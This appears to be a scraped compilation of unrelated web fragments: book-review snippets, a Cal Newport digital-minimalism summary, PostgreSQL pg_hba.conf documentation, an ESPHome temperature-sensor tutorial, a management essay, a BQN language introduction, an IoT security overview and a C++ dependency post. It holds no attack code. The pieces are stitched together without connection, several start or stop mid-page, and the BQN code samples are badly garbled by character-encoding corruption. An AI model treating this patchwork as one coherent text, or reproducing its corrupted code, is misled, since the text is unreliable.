<p>To provide more context to the reader, Bogle illustrates returns of various mutual funds and index funds through diagrams and charts. Also, he compares, based on how invested, your original investment, and how it would look after a particular time.</p>
<p>Moreover, I like the book format. It’s divided into short chapters along with useful data, and neat quotation sections at the end of each chapter.</p>
<p><em>“The greatest enemy of a good plan is the dream of a perfect plan. Stick to the good plan.”—John Bogle, founder of The Vanguard Group.</em></p>

<hr>
<h2 id="10-think-and-grow-richhttpsamznto2pkkllk"><a href="https://amzn.to/2PKKLLK">10. Think and Grow Rich</a></h2>
<p>No doubt, this book’s principles can be used in any area of life, not just about monetary wealth, because richness means not only necessarily money. It measures not only in terms of financial gain and success but also in business ownership, development, intelligence, and working in general.</p>
<p><strong>Richness has everything to do with investing in yourself!</strong></p>
<p>Everything starts with how we think. We can achieve anything we want:</p>
<p><em>“Whatever the mind of man can conceive and believe, it can achieve.”—Napoleon Hill</em></p>
<p><strong>The book contains success stories for 13 lessons from people who have made great strides in achieving unbelievable financial goals.</strong> Every story begins with the idea when the person has committed themselves, so the opportunities come, and they begin to prosper.</p>
<p>Perhaps, it’s the only book a person needs to read to learn how to grow rich because most of the other such books are either inspired, referenced, or paraphrased from this book.</p>
<p><strong>Think, grow, be rich!</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e3504ec76b77ff1299a4"><div><h4>Who is Cal Newport?</h4><h3>#1 Social Media Is Not Neutral</h3><p>How can Facebook can offer a service for <em>free</em> but still make billions of dollars a week?</p><p>Simple: Create a socially engineered app that empowers people to be the hero of their own life stories. The more content that is uploaded, the more data these companies’ dissect and more data points can be sold off to advertisers. </p><blockquote><p><em>Minimizing distraction and respecting users’ attention would reduce revenue. Compulsive use sells…the attention economy drives companies like Google into a “race to the bottom of the brain stem.” - Cal Newport</em></p></blockquote><p>The goal of social media platforms is to maximize eye-time on screen at all costs. </p><p>The more you post, the more they will make. Facebook, Twitter, Instagram, SnapChat or Tik Tok aren’t the products, <em>their users are the products. </em></p><h4>#2 Biologically Hardwired For Addiction</h4><p>Status is evolutionarily programmed into us. Knowing where you stood in your tribe’s pecking order helped you assess how safe your position was. Comparison is, for better or worse, one of the fundamental lenses we see ourselves through. </p><p>In 2000 you just had your 30 classmates to compare yourself with. In 2020 you have 4,5 billion others to compare yourself with. Our lizard brains salivate at a real time pecking order tracker we can tap into at anytime. <br></p><h3>#3 Random = Reward</h3><p>You’re never quite sure what you’re about the get when you pull the lever, roll the dice, or draw your cards. That’s why gambling is so addicting.</p><p>Social media platforms work the same way. When you post you’re pulling the slot machine lever. And while you can’t hit the jackpot and go viral every time it happens <em>just enough times </em>to others you perceive as just like you to make you think <em>this next one is it</em>. </p><p>Likes, retweets, comments, tagging, beeps, boops and bops have one goal: to create a cognitively irresistible amount of novelty. <br></p><h3>#4 What is Technology For?</h3><p>To reclaim your attention it is helpful to identify what they clear ROI of using a particular app is. <br></p><p>In my first business I was shocked to see that I was spending 4+ hours a day on social media. In reality social media only served two purposes (1) keeping a record of clients trained and (2) generating leads for business. That’s it. And when I actually did this, I only used social media for less than ten minutes a day. <br></p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597490210226_10433"><div><h3>#5 Out of Pocket</h3><p>Cal never argues that social media is evil but that it does require guardrails. One of these is deleting your social media apps off of your phone and only access them via laptop. This will increase the barrier to entry on these platforms and keep you away from killing time by taking out your phone. <br></p><h3>#6 Solitude </h3><p>If you want to connect with others better spend more time with yourself in solitude. You need to have a reflective practice where you unplug from the world every now and then. For me it’s journaling but it might be different for others. <br></p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597490210226_11815"><div><h3>#7 You Need A Philosophy </h3><p>Cal Newport defines Digital Minimalism as: </p><blockquote><p>A philosophy of technology use in which you focus your online time on a small number of carefully selected and optimized activities that strongly support things you value and then happily miss out on everything else. </p></blockquote><p>Cal wants readers to shift from using social media out of convenience to using it by choice. Intentionality is at the core of Digital Minimalism. <br></p><h3>Cal Newport Quotes</h3><p><em>Here are some excerpts from my Kindle version of Digital Minimalism. Enjoy. </em></p></div></div></div>]]>

</code></pre></div><p>Allowed <code>TYPE</code>'s:</p>
<ul>
<li><code>local</code> - socket connection - needed to connect from shell on database server</li>
<li><code>host</code> - standard TCP/IP connection over the network - bnost SSL and no SSL</li>
<li><code>hostssl</code> - TCP/IP connection but only with SSL</li>
<li><code>hostnossl</code> - TCP/IP only without SSL</li>
<li><code>hostgssenc</code> - TCP/IP only GSSAPI</li>
<li><code>hostnogssenc</code> - TCP/IP only without GSSAPI</li>
</ul>
<p>With <code>DATABASE</code> we can specify database name or use special value <code>sameuser</code> if database name should be same as name of user that is connecting.</p>
<p>With <code>USER</code> we can specify user or role - role name should be preceded by <code>+</code> sign.</p>
<p><code>ADDRESS</code> field could be - hostname, IP range in CIDR format or special words:</p>
<ul>
<li><code>samehost</code> - which correspond to all IP adresses of database server</li>
<li><code>samenet</code> - which correspond to all IP in database server subnet</li>
</ul>
<p>With <code>METHOD</code> field we can set one of authentication methods - most important ones are:</p>
<ul>
<li><code>trust</code> - allow connection without password - moslty set for local connections from database server itself</li>
<li><code>reject</code> - reject connections</li>
<li><code>md5</code> - allow connections after getting from user password - encrypted</li>
<li><code>password</code> - allow connection after getting plain password - DO NOT USE in untrusted networks - better -&gt; never use this option</li>
<li><code>ldap</code> - getting account authorization data from LDAP server</li>
</ul>
<p>In <code>DATABASE</code> and <code>USER</code> fields you can specify special word <code>all</code> if you don’t want to create any restrictions here.</p>
<p>There can be situation when we must use additional field named <code>auth-options</code> for specyfying details for example for <code>hostssl</code> connection type. This topic will be covered in another post.</p>

It’s hot here, like really hot!</p><figure><img src="https://theorangeone.net/posts/esphome-dht-sensor/grafana-graph_hue8817786cbb53c9e8bd4ad7a6a582421_100626_1500x0_resize_lanczos_2.png" alt="Temperature recordings from my bedroom this past few days"><figcaption><small>Temperature recordings from my bedroom this past few days</small></figcaption></figure><p>Us brits are incapable of handling the heat, and enjoy nothing more than telling each other how hot and unbearable it is. I’m definitely guilty of this, and as a ginger, I’m worse than most. When telling people quite how hot it is, wouldn’t it be great to have your own sensor in your room, plotting the temperature, and storing the data in home-assistant? Yes? Then you’re in the right place.</p><h2 id="requirements"><a href="#requirements">#</a> Requirements</h2><p>To build the sensor, you’ll need a few things:</p><ul><li><a href="https://www.home-assistant.io/">HomeAssistant</a></li><li><a href="https://esphome.io/">ESPHome</a> (installation instructions <a href="#install-esphome">below</a>)</li></ul><p>And a few components:</p><ul><li><a href="https://esphome.io/#devices">ESPHome-compatible</a> board (I’m using a NodeMCU from <a href="https://www.amazon.co.uk/MakerHawk-Internet-Development-Wireless-Micropython/dp/B07M8Q38LK">amazon.co.uk</a>)</li><li>DHT11 (DHT22 is significantly nicer, but more expensive)</li><li>Jumper cables (often come with the DHT)</li></ul><h2 id="steps"><a href="#steps">#</a> Steps</h2><h3 id="install-esphome"><a href="#install-esphome">#</a> Install ESPHome</h3><p>ESPHome has a few installation methods, however I recommend using <a href="https://hub.docker.com/r/esphome/esphome">Docker</a> as it presents an incredibly simple to use web UI, and makes interfacing much easier. When using the docker container, you’ll need to set <code>network_mode: host</code> to support OTA updates and detection.</p><div><pre><code data-lang="yaml"><span>  </span><span>esphome</span><span>:</span><span>
</span><span>    </span><span>image</span><span>:</span><span> </span>esphome/esphome<span>:</span>latest<span>

</span></code></pre></div><p>I have it installed on the same machine HomeAssistant is, but that’s not necessary. ESPHome is just the UI - the communication is direct between HomeAssistant and the boards.</p><p>Once started, it should be accessible via <code>&lt;ip&gt;:6052</code>. Note this UI is unauthenticated, so probably shouldn’t be internet-accessible.</p><h3 id="construct-circuit"><a href="#construct-circuit">#</a> Construct circuit</h3><p>Constructing your sensor is very simple and doesn’t require any soldering.</p><p>The first step is to identify the right pins on the DHT sensor. There are 3 pins: ground, power and data. When connecting up your sensor, you’ll need to ensure the ground pin is connected to ground, 3.3V is connected to a 3.3v output, and data is connected to one of the data pins.</p><p>The pins labelled on the board are not necessarily all accessible to ESPHome, nor are the numbers correct. Be sure to check the <a href="https://esphome.io/devices/nodemcu_esp8266.html">documentation</a> for the specific board you’re using, and connect the pins correctly. In my case, I connected the data line to the pin labelled <code>D1</code>.</p><figure><img src="https://theorangeone.net/posts/esphome-dht-sensor/sensor-circuit_hu817a58996bc5fb0a48a17efd3e2b6009_368106_1500x0_resize_q75_lanczos.jpg" alt="My NodeMCU with connected DHT11"><figcaption><small>My NodeMCU with connected DHT11</small></figcaption></figure><h3 id="create-firmware"><a href="#create-firmware">#</a> Create firmware</h3><p>Next we need to write the config file which will be turned into our firmware. ESPHome configuration is just <code>yaml</code> files, which makes editing and updating simple. The web UI contains a helpful wizard to create the configuration files.</p><p>Go to ESPHome, and click the “+” button to start the setup wizard. This will walk you through naming your sensor and connecting it to WiFi. Once created, a card will appear on the homepage for your sensor, showing it as disconnected. Select “Edit” and you’ll be presented with a yaml file:</p><div><pre><code data-lang="yaml"><span>esphome</span><span>:</span><span>

</span></code></pre></div><p>With this configuration, The ESPHome firmware will connect to your device WiFi network and expose an API which HomeAssistant can connect to. This API is password protected, and will be needed for the HomeAssistant setup later.</p><p>Next we need to set up the sensor. This is done with an additional section in the configuration:</p><div><pre><code data-lang="yaml"><span>sensor</span><span>:</span><span>

</span></code></pre></div><p>The sensor names here will correspond to sensor names in HomeAssistant. Be sure to set the correct pin and model for your sensor. The <a href="https://esphome.io/components/sensor/dht.html">documentation</a> shows the possible values you can set for these.</p><h3 id="flash-firmware"><a href="#flash-firmware">#</a> Flash firmware</h3><p>ESPHome has a great feature where you can modify the configuration and update boards wirelessly over the network. Unfortunately, this doesn’t work for the initial flash. For this, we have to download the firmware and flash it ourselves.</p><p>Before the firmware can be flashed, it must be compiled. This takes the configuration yaml and turns it into a firmware file. To do this, click the 3 dots on the relevant device card and select “Compile”. This will take some time (30 seconds or so), after which you’ll be presented with <code>INFO Successfully compiled program.</code>. At this point, you can click “Download Binary” in the bottom right of the popup to download the <code>.bin</code> firmware.</p><p>The firmware can then be flased using the <a href="https://esphome.io/guides/faq.html#esphome-flasher"><code>esphome-flasher</code></a> utility (available on the <a href="https://aur.archlinux.org/packages/esphome-flasher">AUR</a>). Connect your board over USB, select both it and the downloaded firmware in the flasher UI and select “Flash ESP”. Give it a bit to fully upload, and you’ll then be met with the logs from the board, which now runs ESPHome.</p><h2 id="import-into-home-assistant"><a href="#import-into-home-assistant">#</a> Import into home-assistant</h2><p>Once your board starts up, it should automatically connect to your WiFi using the credentials you put in the config, and be detected by HomeAssistant as a new integration. Once selected, you’ll be prompted for a password. This will again be the same as what was defined in your config.</p><p>The NodeMCU should expose 2 sensors to HomeAssistant, “Temperature” and “Humidity”. If you visit the lovelace UI, you should be able to add cards for them.</p><figure><img src="https://theorangeone.net/posts/esphome-dht-sensor/ha-dashboard_hu6405e05c8bcb17795967ebb5f74820e4_28620_1500x0_resize_lanczos_2.png" alt="My Temperature / Humidity sensors being graphed by HomeAssistant"><figcaption><small>My Temperature / Humidity sensors being graphed by HomeAssistant</small></figcaption></figure><p>Once you’re happy it’s logging everything correctly, you can move it to where you want it to be deployed.</p></div></div>]]>

    <p>Managers are responsible for partnering with reports to grow their career. This growth should be primarily facilitated by the work that is given to the report. This growth should not be primarily facilitated by “extracurriculars.” Let’s dive into some details.</p>

<p>There are two kinds of ways people can grow skill-sets: the work the business needs or extracurriculars. Extracurriculars are things that are not (or are not in service of accomplishing) a priority for the business. Extracurriculars commonly include:</p>
<ul>
  <li>Reading a book</li>
  <li>Doing side projects</li>
  <li>Taking an online class</li>
  <li>Going to meetups</li>
  <li>Going to conferences</li>
</ul>

<p>Companies should to the best of their ability support people who want to do these things. However, it’s a common anti-pattern for managers (and reports, and companies) to treat these activities as primary drivers of growth. There’s a couple main reasons why people intuitively lean on extracurriculars when trying to drive growth:</p>
<ul>
  <li>The alternative to extracurriculars is having people take on work that stretches their ability/skill set, which is less efficient for the business. Stated otherwise: extracurriculars are perceived as 0-risk to the business.</li>
  <li>Interests are confused with growth. Instead of finding ways to strategically grow in a role and in the company, people start growth conversations from “what kind of stuff are you interested in?”*</li>
</ul>

<p>Extracurriculars-as-growth has some major problems:</p>
<ul>
  <li>The machinery of the company is not set up to hold you accountable to actual delivery of extracurriculars. Nobody ever got a raise because they read a book. Nobody ever got fired because they didn’t read a book. It’s very common to see  extracurricular tasks in growth plans only to never be followed up on.</li>
  <li>Extracurriculars are usually done off the clock. Companies often don’t make time for people to actually do that work and it’s implicit that the report needs to find time to do both those things and their regular work. Company-driven growth should be done nearly exclusively on the company’s time. Because homework is often not a priority, the company often doesn’t support it being done on the clock, and this - appropriately, obviously - leads to conflict. Expecting homework from an employee isn’t fair.</li>
  <li>Extracurriculars are often interest-based, not growth-based. So the work often doesn’t translate into any meaningful increase in impact at the company.</li>
</ul>

<p>Ok, so extracurriculars-as-growth is bad. Let’s fix it. It’s easy - skills should be grown via work the business needs. The company supports that work and holds people accountable to doing it. That growth will be directly in-line with what the company needs. And growing via that work will also actually deliver impact in a way that gets you rewards.</p>

<p>Like eating your vegetables or daily exercise - it sounds easy, but putting this into practice can be difficult. In fact, getting it done is a major culture shift. You have to build a culture that:</p>
<ul>
  <li>Is willing to invest in people at the cost of optimal delivery in the short term.</li>
  <li>Trusts people to fail. The other main anti-pattern is to give people a chance and then pull them out of the critical path the minute they make a mistake.</li>
</ul>

<p><em>Try it <a href="https://mlochbaum.github.io/BQN/try.html">here</a>! The online version is mainly good for small programs currently; see <a href="https://mlochbaum.github.io/BQN/running.html">running.md</a> for more options.</em></p>
<p><strong>BQN</strong> is a new programming language in the APL lineage, which aims to remove inconsistent and burdensome aspects of the APL tradition and put the great ideas on a firmer footing. BQN is aimed at existing and aspiring APL-family programmers, and using it requires a solid understanding of functions and multidimensional arrays. However, because of its focus on providing simple, consistent, and powerful array operations, BQN should also be a good language for learning array programming and building stronger array intuition.</p>
<p>BQN maintains many of the ideas that made APL\360 revolutionary in 1966:</p>
<ul>
<li>Human-friendly <strong>infix notation</strong> with no precedence rules to remember.</li>
<li><strong>Built-in array operations</strong> handle any number of dimensions easily.</li>
<li><strong>Higher-order functions</strong> allow basic functions to be applied in more powerful ways.</li>
</ul>
<p>It incorporates concepts developed over years of APL practice:</p>
<ul>
<li>The <a href="https://mlochbaum.github.io/BQN/doc/leading.html"><strong>leading axis model</strong></a>, which allows for simpler built-in functions.</li>
<li>Trains and combinators for <strong>tacit programming</strong>.</li>
<li>Lightweight <strong>anonymous functions</strong> (like <a href="https://aplwiki.com/wiki/Dfn">dfns</a>).</li>
</ul>
<p>But BQN is redesigned from the ground up, with brand new ideas to make these paradigms easier to use and less likely to fail.</p>
<ul>
<li>The <strong>based array model</strong> makes non-arrays a fundamental part of the language, and removes the surprise of floating arrays and the hassle of explicit boxes. New <strong>array notation</strong> eliminates the gotchas of <a href="https://aplwiki.com/wiki/Strand_notation">stranding</a>.</li>
<li>A <a href="https://mlochbaum.github.io/BQN/doc/context.html"><strong>context-free grammar</strong></a> where a value's syntactic role is determined by its spelling makes it easier for machines and humans to understand code.</li>
<li>Oh, and it naturally leads to <a href="https://mlochbaum.github.io/BQN/doc/functional.html"><strong>first-class functions</strong></a>, a feature often missed in APL.</li>
<li>The <strong>new symbols</strong> for built-in functionality allow the syntactic role of a primitive to be distinguished at a glance, and aim to be more consistent and intuitive.</li>
</ul>
<h2 id="what-kind-of-name-is-bqn">What kind of name is "BQN"?</h2>
<p>It's three letters, that happen to match the capitals in "Big Questions Notation". You can pronounce it "bacon", but are advised to avoid this unless there's puns.</p>
<h2 id="what-does-bqn-look-like">What does BQN look like?</h2>
<p>Rather strange, most likely:</p>
<pre>    <span>âŠ‘+</span><span>`</span><span>âˆ˜</span><span>âŒ½</span><span>â�Ÿ</span><span>12</span><span>â†•</span><span>2</span>  144
</pre>
<p>For longer samples, you can <a href="https://github.com/mlochbaum/BQN/blob/master/src/c.bqn">gaze into the abyss</a> that is the self-hosted compiler, or the <a href="https://github.com/mlochbaum/BQN/blob/master/src/r.bqn">shallower but wider abyss</a> of the runtime, or take a look at the friendlier <a href="https://github.com/mlochbaum/BQN/blob/master/md.bqn">markdown processor</a> used to format and highlight documentation files. There are also <a href="https://github.com/mlochbaum/BQN/blob/master/examples/fifty.bqn">some translations</a> from <a href="https://www.jsoftware.com/papers/50/">"A History of APL in 50 Functions"</a> here.</p>
<h2 id="array-model">Array model</h2>
<p>Most of BQN's functionality deals with the manipulation of multidimensional arrays. However, it discards many of the complications of traditional APL <a href="https://aplwiki.com/wiki/Array_model">array models</a>. Unlike in APL, non-array data is possible, and common: numbers, characters, and functions are not arrays (see the full list of <a href="#types">types</a> below). This avoids some difficulties that show up when trying to treat scalar arrays as the fundamental unit; in particular, there is no "floating" so a value is always different from a scalar array that contains it. This system has been <a href="https://dl.acm.org/doi/abs/10.1145/586656.586663">proposed</a> in APL's past under the name <strong>based array theory</strong>.</p>
<p>Currently, the intention is that arrays will not have prototypes, so that all empty arrays of the same shape behave identically. Different elements of an array should not influence each other. While some APLs force numbers placed in the same array to a common representation, which may have different precision properties, BQN will enforce 64-bit floating-point precision, and only use representations or methods compatible with it (for example, integers up to 32 bits).</p>
<h2 id="syntax">Syntax</h2>
<p>BQN syntax consists of expressions where computation is done with a little organizing structure around them like assignment, functions, and list notation. Expressions are where the programmer is in control so the design tries to do as much as possible with them before introducing special syntax.</p>
<h3 id="expressions">Expressions</h3>
<p>Like APL, BQN uses four <em>syntactic roles</em> for values in expressions:</p>
<ul>
<li><strong>Subjects</strong>, like APL arrays or J nouns</li>
<li><strong>Functions</strong>, or verbs in J</li>
<li><strong>1-Modifiers</strong>, like APL monadic operators or J adverbs</li>
<li><strong>2-Modifiers</strong>, like APL dyadic operators or J conjunctions.</li>
</ul>
<p>These roles work exactly like they do in APL, with functions applying to one or two subject arguments, 1-modifiers taking a single function or subject on the left, and 2-modifiers taking a function or subject on each side.</p>
<p>Unlike APL, in BQN the syntactic role of a value is determined purely by the way it's spelled: a lowercase first letter (<code><span>name</span></code>) makes it a subject, an uppercase first letter (<code><span>Name</span></code>) makes it a function, and underscores are used for 1-modifiers (<code><span>_name</span></code>) and 2-modifiers (<code><span>_name_</span></code>). Below, the function <code><span>{</span><span>ð�•Ž</span><span>ð�•©</span><span>}</span></code> treats its left argument <code><span>ð�•Ž</span></code> as a function and its right argument <code><span>ð�•©</span></code> as a subject. With a list of functions, we can make a table of the square and square root of a few numbers:</p>
<pre>    <span>âŸ¨</span><span>Ã—</span><span>Ëœ</span><span>,</span><span>âˆš</span><span>âŸ©</span> <span>{</span><span>ð�•Ž</span><span>ð�•©</span><span>}</span><span>âŒœ</span> <span>1</span><span>â€¿</span><span>4</span><span>â€¿</span><span>9</span>
â”Œâ”€         
â•µ 1 16 81  
  1  2  3  
          â”˜
</pre>
<p>BQN's built-in operations also have patterns to indicate the syntactic role: 1-modifiers (<code><span>ËœÂ¨Ë˜â�¼âŒœÂ´`</span></code>) are all superscript characters, and 2-modifiers (<code><span>âˆ˜â—‹âŠ¸âŸœâŒ¾âŠ˜â—¶âš‡âŽ‰â�Ÿ</span></code>) all have an unbroken circle (two functions <code><span>âŒ½â�‰</span></code> have broken circles with lines through them). Every other built-in constant is a function, although the special symbols <code><span>Â¯</span></code>, <code><span>âˆž</span></code>, and <code><span>Ï€</span></code> are used as part of numeric literal notation.</p>

<p><em>Combinators</em> only control the application of functions. Because a non-function operand applies as a constant function, some combinators have extra meanings when passed a constant. For example, <code><span>0</span><span>Ëœ</span></code> is the constant function that always returns 0 and <code><span>0</span><span>âŠ¸</span><span>&lt;</span></code> is the function that tests whether its right argument is greater than 0.</p>

<p>Choose isn't really a combinator since it calls the function <code><span>âŠ‘</span></code>, and Under is not a true combinator since it has an "undo" step at the end. This step might be implemented using the left operand's inverse (<em>computational</em> Under) or its structural properties (<em>structural</em> Under).</p>

<h2 id="literal-notation">Literal notation</h2>
<h3 id="constant-notation">Constant notation</h3>
<p>BQN has single-token notation for numbers, strings, and characters.</p>
<p>Numbers allow the typical decimal notation with <code><span>Â¯</span></code> for the negative sign (because <code><span>-</span></code> is a function) and <code><span>e</span></code> for scientific notation (or <code><span>E</span></code>, as numeric notation is case-insensitive). <code><span>âˆž</span></code> and <code><span>Ï€</span></code> may be used as special numeric values. Complex numbers are also allowed, with the components separated by <code><span>i</span></code>.</p>
<p>Strings are written with double quotes <code><span>""</span></code>, and characters with single quotes <code>''</code> with a single character in between. A double quote within a string can be escaped by writing it twice; if two string literals are next to each other, they must be separated by a space. In contrast, character literals do not use escapes, as the length is already known.</p>
<h3 id="separators">Separators</h3>
<p>The characters <code><span>â‹„</span></code> and <code><span>,</span></code> and newline are completely interchangeable and are used to separate expressions. An expression might be an element in a list or a line in a function. Empty sectionsâ€”those that consist only of whitespaceâ€”are ignored. This means that any number of separators can be used between expressions, and that leading and trailing separators are also allowed. The expressions are evaluated in text order: left to right and top to bottom.</p>
<h3 id="list-notation">List notation</h3>
<p>Lists (1-dimensional arrays) are enclosed in angle brackets <code><span>âŸ¨âŸ©</span></code>, with the results of the expressions in between being the list's elements. Lists of two elements or more can also be written with the ligature character <code><span>â€¿</span></code>. This character has higher binding strength than any part of an expression. If one of the elements is a compound expression, then it will need to be enclosed in parentheses.</p>

					<p>The idea of Internet of Things (IoT) was first discussed in 1982 when a Coca-Cola vending machine was modified at Carnegie Mellon University to report the inventory and the temperature of the loaded drinks making it the first ever IoT appliance. Today IoT devices find their applications in every field be it at home, personal goods, transportation, healthcare, manufacturing, agriculture, military and many more. With the demand for digitalization, the IoT technology is rapidly booming and is currently a $250 billion industry in 2019. While the IoT era of products brings numerous advances and modern comfort to the lives of consumers, the main feature of connectivity of these products create unexpected ports to sensitive data, critical systems and devices. In this article, we will get a basic understanding of the IoT world as well as look into the vulnerabilities and security issues that daunt the IoT devices and discuss some of the possible solutions which can be implemented to overcome these security challenges.</p><h2><strong>What is IoT?&nbsp;</strong></h2><p>It is a world of smart sensors and assets connected together to collect and share our data enabling new insights which transform our everyday lifestyle and/or business. The IoT technology is connection of physical and digital components which function without the aid from human mediators. Each component is recognized using its Unique Identifier (UID).</p><h2><strong>What is an IoT device?</strong></h2><p>An IoT device is a piece of hardware having sensors that help in transmission of data from one location to another over the internet. The IoT devices comprise of wireless sensors, actuators, computer devices and software which can be embedded within mobile devices, medical devices, industrial equipment and many more.&nbsp;</p><h2><strong>What is IoT Connectivity?</strong></h2><p><strong><img src="https://skillsireupload.s3.amazonaws.com/upload/photos/2020/07/v2le6MNGHr5yMx3HKzvG_31_6abc0d937c4df3f3e4e189918fbabfb7_image.png" alt="" width="580" height="396"></strong></p><p>The connectivity in IoT being the vital element is very important. Therefore, selecting the most appropriate connection technology becomes a critical decision for any enterprise. As the IoT devices are developed for wide range of operations, they incorporate connectivity for Wi-Fi, Bluetooth and wired connections (Ethernet cables). Selection of best communication method primarily depends on 3 factors: cost, distance and power consumption.</p><h2><strong>What are IoT components?</strong></h2><p><strong><img src="https://skillsireupload.s3.amazonaws.com/upload/photos/2020/07/PCIclSSW6GVXjqaUPpfE_31_c55e9fbf15711ff756c6e9c523e0bee0_image.png" alt="" width="423" height="397"></strong></p><p>There are a set of components which ensure the working of the IoT technology and are relevant to security analysis of the IoT. The energy and space being major concerns, the&nbsp;IoT devices are composed of limited resources having low computational power and small storage space. Hence, the components are designed to meet these requirements. The key components are:</p><ol><li><h4><strong>Sensors/Devices:</strong></h4>The sensors&nbsp;record important parameters of the physical environment like motion, temperature, force, water flow, light, humidity, flame, air quality, proximity and so on. Actuator devices are the ones that affect the physical environment such as producing a sound, turning the light off, opening a door and others. Examples of these devices are TV, speakers, motor and so on.</li><li><h4><strong>Connectivity:</strong></h4>Now all the data collected by these sensors is first&nbsp;transported to the cloud infrastructure and to other devices from&nbsp;there. The transmission can take place using satellite networks, Wide Area Networks (WAN), Low Power WAN (LP-WAN), Wi-Fi, cellular networks, Bluetooth, etc.</li><li><h4><strong>Data Processing:&nbsp;</strong></h4>The data collected from the devices then requires processing or in other words taking action based on the data. This can be the simplest task of switching on the room light or in more complex cases of&nbsp;alerting the user of an intruder.&nbsp;</li><li><h4><strong>User Interface:&nbsp;</strong></h4>Lastly, it’s about how the information is made available to the user either in the form of notifications, beeps, alarms or video feed and various others.&nbsp;</li></ol><p>With the rise in digital transformation amongst industries, organizations and government, the endorsement of IoT technology is rapidly increasing. Study shows in 2018, there were around 7 billion IoT devices installed worldwide, in 2019 the number raised to 26.66 billion. A new IoT device is said to connect to the web every 8 milliseconds estimating the total to 31 billion devices by the end of 2020 and by 2025 to reach an outrageous count of over 75 billion IoT devices. Having so many devices in the market, security becomes the highest concern as most of the data accumulated on these devices are personal and require privacy.&nbsp;</p><p>It not just about us interacting with our mobile devices/computers/cars anymore, it’s about the other things that access our devices without our interference. These "things" are continuously communicating with the internet, be it the case of temperature in the house or our heartbeat rate or vehicle sending message to the mechanic to inform about its servicing.&nbsp;</p><p>In spite of having undeniable benefits, a 2019 survey showed that "75% of people distrust the way data is shared" whereas "Creepy" was the word used by 63% of people to describe the connected devices. So, increasing the security levels of these devices is a necessity for the companies producing them. The goal is to avoid giving opportunities to intruders/hackers to not only hack into the products but also to the other devices&nbsp;they are connected to.</p><h2>IoT Vulnerabilities and Security Concerns:</h2><p>Some of the top security issues are listed below:</p><ol><li><h4><strong>IoT manufacturers security negligence:&nbsp;</strong></h4>With all the competition in the market and upgrades available to products, the manufacturers of the IoT devices do not always have security as the critical element in their design process in comparison to adding the internet facilities onto the device. Most of them come with weak, guessable passwords being simple, short and publicly common/available passwords.&nbsp;</li><li><h4><strong>Data theft:</strong></h4>Since IoT device contains&nbsp;personal information about the user, including credit card details, account passwords, health information, purchase records, etc. An individual can lose their identity if the device is improperly secured and is vulnerable to theft.&nbsp;</li><li><h4><strong>Lack of physical hardening:</strong></h4><p>Sometimes the devices can be used for monitoring purposes and will be left at remote locations for long period of time. But these devices can be tampered with physically using a USB with malware, a CCTV camera outside the home can be hacked into if not properly protected.</p></li><li><p><strong>Data integrity risck in healthcare:</strong></p>IoT devices in medical industry comprise of heart monitors, pacemakers, defibrillators etc. If not secured adequately, the patient's data can be exploited which will make doctors unintentionally damage the health of their patients. For example, a tampered medial IoT device (pacemaker) can give access to hacker to alter the pacing or deplete the battery.&nbsp;</li><li><h4><strong>Fraud IoT devices:</strong></h4>With the increase of IoT devices, rogue/counterfeit malicious IoT devices are starting to be installed on secured networks without essential authorization. This device would replace the original device and access all the information the original device would receive. These devices break the network perimeter.&nbsp;</li><li><h4><strong>Lack of secure updates:</strong></h4>The devices can be sold without having the latest firmware/software update. While updating, the device sends it backup data to the cloud and usually suffers a minor downtime. If the updated files are unprotected or the connection is unencrypted, that could be a source.&nbsp;</li><li><h4><strong>Threat to others (Botnet attack):</strong></h4>A botnet is a collection of malware infected internet connected devices (millions in count) controlled from a remote location. Hence, it is not a single device affected with malware that poses a threat instead it is the collection of them. The Mirai bot attack in 2016 created a chaos in the IoT security when multiple Distributed Denial of Service (DDoS) attacks infected and brought down the DNS providing services to platforms such as Twitter, Reddit, Airbnb, Netflix and Github.</li><li><h4><strong>&nbsp;Insecure Network Services:</strong>&nbsp;</h4>Consider an unprotected network installed on the devices can be easily infiltrated by the hackers, exposing sensitive user data and financial records to theft. Eavesdropping through the IoT devices is main concern, since a lot of the user information can be jeopardized and used against its owner. In the case of a larger scale of events (industrial level), companies store their large data on the servers which can expose business information to the hackers.</li><li><h4>Devices with outdated components:</h4>The components play a very critical role for the best functioning of the IoT devices. Components can&nbsp;conveniently be available through open sources and the third-party which weren't scanned for security vulnerabilities.&nbsp;</li><li><h4>Unprotected device default settings:</h4>Having difficulties to change the default factory settings generates exploits in systems and devices. It is essential to be able to change the default device settings depending on personal preferences.</li></ol><h2><strong>Methods to improve IoT security:</strong></h2><p>We discussed several IoT technology security vulnerabilities. Let's look into some of the counter measures on how we can improve on them:</p><ol><li><h4><strong>Implementing two separate networks:</strong></h4>Having two separate internet networks connected on their own individual routers is one of the most secure rather more cost-effective solution. This approach keeps our information from being accessed by a compromised device.</li><li><h4><strong>Thorough device scan:</strong></h4>We must scan our devices for any kind of issues before enabling its connection with the network. To ensure perfect functioning of our devices the scans for vulnerabilities should be scheduled on regular basis.&nbsp;</li><li><h4><strong>Creating strong passwords:</strong></h4><p>It very important to access the default settings of the devices and ensure that we replace the&nbsp;default&nbsp;password that the device comes with, to a more unique and&nbsp;secured passwords. Refrain from having the same password for longer time and change it occasionally.</p></li><li><p><strong>Tracking application permissions on our mobile phones:</strong></p>Many IoT devices are …</li></ol></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>In this post, we will talk about dependency management in C++. In particular, we introduce <code>FetchContent</code>, a CMake feature that should get more love!</p>

<p>We start with an overview of dependency management for C++ applications.</p>

<h3 id="git-submodules">Git submodules</h3>

<p>In the past, my default was to add each dependency as a git submodule.
For dependencies with a modern CMake setup, this is enough to make it available to your project.</p>

<p>But what I always disliked about this approach, is that it requires each user to run</p>
<div><div><pre><code>$ git submodule update --init
</code></pre></div></div>
<p>before building the code. I like to make things easy on people using my code. Thus I’m always on the lookout for a way to get rid of running any extra commands. Also, I have caught myself forgetting to run <code>git submodule update --init</code> many times already.</p>

<h3 id="copying-the-code-into-your-repository">Copying the code into your repository</h3>
<p>Of course one can also copy the whole source code of the dependency into the repository of the project. Yet, in my view, this is inferior to submodules. Updating dependencies becomes complicated. And, depending on how big your dependencies are, this will bloat your repository.</p>

<h3 id="conan-and-other-package-managers">Conan (and other package managers)</h3>

<p>Another option is using a package manager like <a href="https://conan.io/">conan</a>.
